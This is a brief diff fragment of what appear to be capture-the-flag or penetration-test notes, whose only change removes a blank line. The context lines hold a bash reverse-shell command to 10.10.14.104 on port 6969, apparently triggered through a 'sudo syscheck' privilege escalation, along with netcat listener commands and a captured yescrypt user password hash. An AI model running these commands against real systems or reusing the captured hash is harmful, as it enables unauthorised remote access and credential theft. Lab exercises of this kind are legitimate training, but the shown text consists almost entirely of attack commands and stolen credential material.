@@ -31,4 +31,3 @@ LISTENER => nc -lvnp 2357
 REVSHELL VIA `sudo syscheck` COMMAND => sh -i >& /dev/tcp/10.10.14.104/6969 0>&1
 LISTENER => nc -lvnp 6969
 USER HASH =>  $y$j9T$IKU310jZ./br3hMhSpYSH0$IbCr4LIWNnOd76D2ObQYiNOCmGX4ZI7DTnKjbs8gXe9
-
